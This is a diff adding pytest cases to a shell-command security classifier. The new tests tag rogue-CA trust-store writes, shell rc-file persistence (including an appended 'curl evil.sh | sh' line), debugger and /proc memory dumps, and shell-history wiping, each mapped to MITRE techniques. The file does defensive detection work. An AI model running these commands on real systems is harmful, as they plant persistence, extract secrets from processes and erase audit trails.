@@ -2809,3 +2809,462 @@ class TestReadOnlySuppressionNetworkExfil:
             f"suppression must remove it. "
             f"got {r.capabilities}"
         )
+
+
+# ─────────────────────────────────────────────────────────────────────
+# Round 4 taxonomy — three gaps identified via shell+python-only threat
+# review (2026-04-28):
+#
+# * ``system_mutate:ca_trust``      — rogue-CA installs / trust-store
+#                                     writes (T1553.004).  One command
+#                                     silently MITMs every TLS
+#                                     connection the session makes.
+# * ``system_mutate:shell_init``    — persistence via user / system
+#                                     shell rc files (T1546.004).  The
+#                                     ``>>`` appended payload executes
+#                                     on every new login / shell.
+# * ``data_read:process_memory``    — debugger attach-by-pid /
+#                                     /proc/<pid>/mem reads / gcore
+#                                     dumps (T1003, T1057).  Extracts
+#                                     secrets out of a browser, ssh-
+#                                     agent, or 1Password process
+#                                     without ever touching its on-
+#                                     disk vault.  The ``strace -p`` /
+#                                     ``lsof -p`` observation shapes
+#                                     are intentionally NOT tagged —
+#                                     they don't read memory.
+#
+# Before the ``data_read:process_memory`` rule landed, ``cat
+# /proc/<pid>/mem`` was silently blessed as
+# ``capability:read_only:filesystem_read`` — the suppression
+# regression guard below pins that bug fixed.
+# ─────────────────────────────────────────────────────────────────────
+
+
+class TestSystemMutateCaTrust:
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # macOS keychain trust-store mutation.
+            "security add-trusted-cert -d -k "
+            "/Library/Keychains/System.keychain rogue.pem",
+            "security add-trusted-cert -r trustRoot "
+            "-k /Library/Keychains/System.keychain rogue.pem",
+            "security remove-trusted-cert rogue.pem",
+            "security add-certificates rogue.pem",
+            # Linux distro trust-store refresh.
+            "update-ca-certificates",
+            "update-ca-trust",
+            "update-ca-trust extract",
+            # p11-kit trust module (install / remove of anchor).
+            "trust anchor --store rogue.pem",
+            "trust anchor rogue.pem",
+            "trust anchor --remove rogue.pem",
+            # NSS certutil add / delete / modify-trust.
+            "certutil -A -n rogue -t C,, -i rogue.pem -d ~/.pki/nssdb",
+            "certutil -D -n rogue -d ~/.pki/nssdb",
+            "certutil -M -n rogue -t C,, -d ~/.pki/nssdb",
+            # Direct writes into the distro trust-root directory.
+            "cp rogue.pem /usr/local/share/ca-certificates/rogue.crt",
+            "echo data >> /etc/ssl/certs/rogue.pem",
+            "cat rogue.pem | tee /etc/pki/ca-trust/source/anchors/rogue.pem",
+            "cp rogue.pem /etc/ca-certificates/trust-source/anchors/rogue.pem",
+        ],
+    )
+    def test_emits_ca_trust(self, cmd: str) -> None:
+        caps = _direct_capabilities(cmd)
+        assert "capability:system_mutate:ca_trust" in caps, (
+            f"{cmd!r} did not emit system_mutate:ca_trust; "
+            f"got {sorted(caps)}"
+        )
+        assert not any(
+            c.startswith("capability:read_only:") for c in caps
+        ), (
+            f"{cmd!r} unexpectedly emitted a read_only:* tag; "
+            f"got {sorted(caps)}"
+        )
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # Pure reads of the same surfaces.
+            "security list-keychains",
+            "security find-certificate -a",
+            "security find-identity",
+            "trust list",
+            "trust dump",
+            "certutil -L -d ~/.pki/nssdb",
+            "certutil -V -u V -n root -d ~/.pki/nssdb",
+            "cat /etc/ssl/certs/ca-bundle.crt",
+            "ls /usr/local/share/ca-certificates",
+        ],
+    )
+    def test_does_not_emit_ca_trust(self, cmd: str) -> None:
+        caps = _direct_capabilities(cmd)
+        assert "capability:system_mutate:ca_trust" not in caps, (
+            f"{cmd!r} unexpectedly emitted ca_trust; got {sorted(caps)}"
+        )
+
+
+class TestSystemMutateShellInit:
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # User-home rc-file append (the classic persistence shape).
+            "echo 'curl evil.sh | sh' >> ~/.bashrc",
+            "echo x >> ~/.zshrc",
+            "echo x >> ~/.zshenv",
+            "echo x >> ~/.zprofile",
+            "echo x >> ~/.profile",
+            "echo x >> ~/.bash_profile",
+            "echo x >> ~/.bash_login",
+            "echo x >> ~/.bash_aliases",
+            "echo x >> ~/.kshrc",
+            "echo x >> ~/.inputrc",
+            "echo x >> $HOME/.bashrc",
+            # Fish — lives under ~/.config/fish/config.fish.
+            "echo x >> ~/.config/fish/config.fish",
+            # Append via tee / full-file replacement via cp / mv /
+            # install / ln; in-place rewrite via sed -i.
+            "cat evil | tee -a ~/.zshrc",
+            "cp evil ~/.bash_profile",
+            "mv evil ~/.zshrc",
+            "install -m 0644 evil ~/.zshrc",
+            "ln -sf /tmp/evil ~/.bashrc",
+            "sed -i 's/old/new/' ~/.bashrc",
+            # System-wide (/etc/) shell init surfaces.
+            "echo x >> /etc/profile",
+            "echo x >> /etc/profile.d/evil.sh",
+            "echo x >> /etc/bash.bashrc",
+            "echo x >> /etc/bashrc",
+            "echo x >> /etc/zshrc",
+            "echo x >> /etc/zshenv",
+            "echo x >> /etc/paths",
+            "echo x >> /etc/paths.d/evil",
+            "echo x >> /etc/fish/config.fish",
+            "cp evil /etc/profile.d/evil.sh",
+            "sed -i 's/foo/bar/' /etc/profile",
+        ],
+    )
+    def test_emits_shell_init(self, cmd: str) -> None:
+        caps = _direct_capabilities(cmd)
+        assert "capability:system_mutate:shell_init" in caps, (
+            f"{cmd!r} did not emit system_mutate:shell_init; "
+            f"got {sorted(caps)}"
+        )
+        assert not any(
+            c.startswith("capability:read_only:") for c in caps
+        ), (
+            f"{cmd!r} unexpectedly emitted a read_only:* tag; "
+            f"got {sorted(caps)}"
+        )
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # Reads of init files — expressly allowed to keep
+            # ``read_only:filesystem_read`` licensure.
+            "cat ~/.bashrc",
+            "less ~/.zshrc",
+            "grep foo ~/.profile",
+            "head -n 20 ~/.bash_profile",
+            # History files are the sibling ``data_read:shell_history``
+            # surface — must not be attributed to shell_init.
+            "cat ~/.bash_history",
+            "cat ~/.zsh_history",
+            # Bare ls / stat — metadata only.
+            "ls ~/.profile",
+            "stat ~/.bashrc",
+        ],
+    )
+    def test_does_not_emit_shell_init(self, cmd: str) -> None:
+        caps = _direct_capabilities(cmd)
+        assert "capability:system_mutate:shell_init" not in caps, (
+            f"{cmd!r} unexpectedly emitted shell_init; "
+            f"got {sorted(caps)}"
+        )
+
+
+class TestDataReadProcessMemory:
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # lldb / gdb attach-by-pid (the canonical shape) and
+            # attach-by-name.
+            "lldb -p 1234",
+            "lldb --attach-pid 1234",
+            "lldb -n Safari",
+            "lldb --attach-name Safari",
+            "gdb -p 1234",
+            "gdb --pid=1234",
+            "gdb --pid 1234",
+            "gdb attach 1234",
+            # frida / frida-trace attach-by-pid / attach-by-name.
+            "frida -p 1234",
+            "frida --attach-pid=1234",
+            "frida --attach-name=Safari",
+            "frida-trace -p 1234 -i calloc",
+            # dtrace attach-by-pid.
+            "dtrace -p 1234 -n 'syscall:::entry'",
+            # Direct /proc/<pid>/mem reads and gcore dumps.
+            "cat /proc/1234/mem",
+            "dd if=/proc/1234/mem of=/tmp/dump",
+            "gcore 1234",
+            "gcore -o /tmp/dump 1234",
+        ],
+    )
+    def test_emits_process_memory(self, cmd: str) -> None:
+        caps = _direct_capabilities(cmd)
+        assert "capability:data_read:process_memory" in caps, (
+            f"{cmd!r} did not emit data_read:process_memory; "
+            f"got {sorted(caps)}"
+        )
+        assert not any(
+            c.startswith("capability:read_only:") for c in caps
+        ), (
+            f"{cmd!r} unexpectedly emitted a read_only:* tag; "
+            f"got {sorted(caps)}"
+        )
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # Observation-only tools on a pid — they do not read
+            # process memory, so they stay untagged.
+            "strace -p 1234",
+            "lsof -p 1234",
+            "renice -p 1234",
+            # Debugger invocations without an attach.
+            "lldb --help",
+            "lldb myapp",
+            "gdb myapp",
+            "gdb core.1234",
+            # /proc/<pid>/<non-mem> reads — other categories own these.
+            "cat /proc/1234/cmdline",
+            "cat /proc/1234/status",
+            "cat /proc/self/status",
+            # /proc/<pid>/environ is the ``process_env`` surface.
+            "cat /proc/1234/environ",
+        ],
+    )
+    def test_does_not_emit_process_memory(self, cmd: str) -> None:
+        caps = _direct_capabilities(cmd)
+        assert (
+            "capability:data_read:process_memory" not in caps
+        ), (
+            f"{cmd!r} unexpectedly emitted process_memory; "
+            f"got {sorted(caps)}"
+        )
+
+
+class TestProcessMemoryReadOnlyRegressionGuard:
+    """Regression guard for the silent read-only allowance on
+    ``cat /proc/<pid>/mem``.
+
+    Before the ``data_read:process_memory`` rule landed, the bare
+    ``cat /proc/1234/mem`` shape matched the ``read_only:filesystem_read``
+    rule and was eligible for the consumer fast-path ALLOW.  That was
+    strictly worse than having no tag at all.  The ``data_read:*``
+    family is in ``_safe_for_read_only``'s read-only-incompatible
+    prefix set, so emitting ``data_read:process_memory`` now
+    suppresses the ``read_only:*`` tag on the same command.
+    """
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            "cat /proc/1234/mem",
+            "cat /proc/self/mem",
+            "head -c 4096 /proc/1234/mem",
+            "xxd /proc/1234/mem",
+            "dd if=/proc/1234/mem of=/tmp/dump bs=1 count=4096",
+        ],
+    )
+    def test_proc_pid_mem_read_is_not_read_only(self, cmd: str) -> None:
+        r = inspect_command(cmd)
+        assert (
+            "capability:data_read:process_memory" in r.capabilities
+        ), (
+            f"{cmd!r} did not emit data_read:process_memory; "
+            f"got {r.capabilities}"
+        )
+        assert not any(
+            c.startswith("capability:read_only:") for c in r.capabilities
+        ), (
+            f"{cmd!r} was blessed as read_only:*, which is the exact "
+            f"silent-allowance bug the process_memory rule fixes. "
+            f"got {r.capabilities}"
+        )
+
+
+# ─────────────────────────────────────────────────────────────────────
+# Round 5 taxonomy — shell-history anti-forensics (2026-04-28 follow-up).
+#
+# ``system_mutate:history_tamper`` covers the "attacker covers their
+# tracks" surface: wiping or relocating the shell history file,
+# zeroing HISTSIZE/HISTFILESIZE, disabling history recording, or
+# scrubbing the history file on disk.  MITRE tactic:
+# ``defense_evasion`` / T1070.003 (Indicator Removal: Clear Command
+# History).
+#
+# Before the rule landed, ``history -c`` / ``history -d`` / ``history
+# -w /dev/null`` / ``history -r /dev/null`` were the symmetric silent-
+# allowance bug to ``cat /proc/<pid>/mem``: all four matched the
+# bare ``read_only:system_info`` pattern via the ``history`` head,
+# which meant an attacker's wipe could ride the consumer fast-path
+# ALLOW.  The regression guard class below pins that fixed.
+# ─────────────────────────────────────────────────────────────────────
+
+
+class TestSystemMutateHistoryTamper:
+    # Layering note. ``rm``/``shred``/``truncate`` on a history file
+    # shape is owned by the catastrophic-pattern layer (step 3) which
+    # short-circuits the classifier for the destructive-file-verb
+    # family at large. The positive test therefore goes through
+    # ``_direct_capabilities`` for those shapes so the classifier
+    # regex stays the load-bearing hook if the pattern layer ever
+    # weakens — same convention as ``TestSystemMutateKernelExtension``
+    # and ``TestSystemMutateCronMutation``.
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # history builtin destructive verbs (the exact 4 that
+            # were read_only-blessed before this rule landed).
+            "history -c",
+            "history -d 5",
+            "history -d 100",
+            "history -w /dev/null",
+            "history -r /dev/null",
+            # HISTFILE / HISTSIZE / HISTFILESIZE env tampering.
+            "unset HISTFILE",
+            "export HISTFILE=/dev/null",
+            "HISTFILE=/dev/null",
+            "HISTFILE=/dev/null bash -i",
+            "export HISTSIZE=0",
+            "export HISTFILESIZE=0",
+            "HISTSIZE=0",
+            "HISTFILESIZE=0",
+            # Disable history-recording mode in the current shell.
+            "set +o history",
+            # Direct file-tamper shapes on shell-history files.
+            "rm ~/.bash_history",
+            "rm -f ~/.zsh_history",
+            "rm /home/alice/.bash_history",
+            "shred ~/.bash_history",
+            "shred -u ~/.bash_history",
+            "truncate -s 0 ~/.bash_history",
+            "cp /dev/null ~/.bash_history",
+            "mv /tmp/clean ~/.bash_history",
+            "echo > ~/.bash_history",
+            ": > ~/.bash_history",
+            # Append (inject fake entries / append to lie about
+            # history) is also mutation.
+            "echo 'faked entry' >> ~/.bash_history",
+            "cat /tmp/foo | tee ~/.bash_history",
+        ],
+    )
+    def test_emits_history_tamper(self, cmd: str) -> None:
+        caps = _direct_capabilities(cmd)
+        assert (
+            "capability:system_mutate:history_tamper" in caps
+        ), (
+            f"{cmd!r} did not emit system_mutate:history_tamper; "
+            f"got {sorted(caps)}"
+        )
+        assert not any(
+            c.startswith("capability:read_only:") for c in caps
+        ), (
+            f"{cmd!r} unexpectedly emitted a read_only:* tag; "
+            f"got {sorted(caps)}"
+        )
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # Legitimate history reads / inspection.
+            "history",
+            "history 10",
+            "history | tail -20",
+            "history | grep sudo",
+            # Re-enable history recording is NOT tamper.
+            "set -o history",
+            # Legitimate HISTFILE relocation or sizing.
+            "HISTFILE=~/mycustom.hist",
+            "HISTFILE=/var/log/shell.log",
+            "HISTSIZE=100000",
+            "HISTFILESIZE=500000",
+            # Reads of the history file (the ``data_read:shell_history``
+            # surface, which must not also receive history_tamper).
+            "cat ~/.bash_history",
+            "less ~/.zsh_history",
+            "grep sudo ~/.bash_history",
+            "ls ~/.bash_history",
+            # Unrelated ``unset`` / ``export``.
+            "unset TERM",
+            "export PATH=/usr/bin",
+            # Unrelated ``rm`` / ``shred`` / ``truncate``.
+            "rm ~/notes.txt",
+            "shred /tmp/scratch",
+            "truncate -s 0 /tmp/scratch",
+            # Different basename (``.bash_history_backup`` ≠
+            # ``.bash_history``).
+            "cat /tmp/.bash_history_backup",
+        ],
+    )
+    def test_does_not_emit_history_tamper(self, cmd: str) -> None:
+        caps = _direct_capabilities(cmd)
+        assert (
+            "capability:system_mutate:history_tamper" not in caps
+        ), (
+            f"{cmd!r} unexpectedly emitted history_tamper; "
+            f"got {sorted(caps)}"
+        )
+
+
+class TestHistoryTamperReadOnlyRegressionGuard:
+    """Regression guard for the silent read-only allowance on shell-
+    history tampering.
+
+    Before the ``system_mutate:history_tamper`` rule landed,
+    ``history -c`` / ``history -d <n>`` / ``history -w /dev/null`` /
+    ``history -r /dev/null`` matched the bare
+    ``read_only:system_info`` regex via the ``history`` head and
+    were eligible for the consumer fast-path ALLOW — strictly worse
+    than having no tag at all.  ``set +o history`` and
+    ``unset HISTFILE`` never hit read_only but also had no
+    deterministic deny tag.  The ``system_mutate:*`` family is in
+    ``_safe_for_read_only``'s read-only-incompatible prefix set, so
+    emitting ``system_mutate:history_tamper`` on these shapes
+    suppresses any ``read_only:*`` tag and gives policy a named
+    deny surface.
+    """
+
+    @pytest.mark.parametrize(
+        "cmd",
+        [
+            # The four shapes that had the silent read_only allowance.
+            "history -c",
+            "history -d 5",
+            "history -w /dev/null",
+            "history -r /dev/null",
+            # The siblings that were simply untagged before.
+            "set +o history",
+            "unset HISTFILE",
+            "export HISTFILE=/dev/null",
+        ],
+    )
+    def test_history_wipe_is_not_read_only(self, cmd: str) -> None:
+        r = inspect_command(cmd)
+        assert (
+            "capability:system_mutate:history_tamper" in r.capabilities
+        ), (
+            f"{cmd!r} did not emit system_mutate:history_tamper; "
+            f"got {r.capabilities}"
+        )
+        assert not any(
+            c.startswith("capability:read_only:") for c in r.capabilities
+        ), (
+            f"{cmd!r} was blessed as read_only:*, which is the exact "
+            f"silent-allowance bug the history_tamper rule fixes. "
+            f"got {r.capabilities}"
+        )
